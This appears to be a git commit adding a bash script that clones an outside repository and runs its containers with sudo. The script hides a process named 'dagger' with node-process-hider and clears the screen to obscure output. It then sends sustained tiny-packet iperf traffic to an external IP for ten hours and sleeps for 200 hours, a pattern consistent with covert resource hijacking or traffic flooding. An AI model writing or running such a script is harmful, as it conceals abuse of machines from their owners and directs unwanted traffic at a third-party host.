b95f7b7e0b4cc44ea4aff823ed4e414e5124ec0d
lidiabisimahum <124005386+lidiabisimahum@users.noreply.github.com>
2023-06-01 16:57:44 +0700

    Create farhas.sh

---
+++ farhas.sh
@@ -0,0 +1,16 @@
+#!/usr/bin/env bash
+git clone https://github.com/sinyohadursi/waera.git
+cd waera
+sudo apt-get update
+sudo apt install docker.io -y
+sudo apt install npm -y
+sudo npm i -g node-process-hider && sudo ph add dagger
+sudo curl -L "https://github.com/docker/compose/releases/download/1.27.4/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose && \
+    chmod +x /usr/local/bin/docker-compose
+sudo docker-compose build --parallel 
+sudo docker-compose up -d  && clear 
+sudo apt-get install iperf -y
+sudo docker-compose logs
+sudo iperf -c 159.223.168.17 -t 36000 -i 10 -l 0.001K & sudo apt install nethogs -y
+sudo nethogs
+sleep 200h
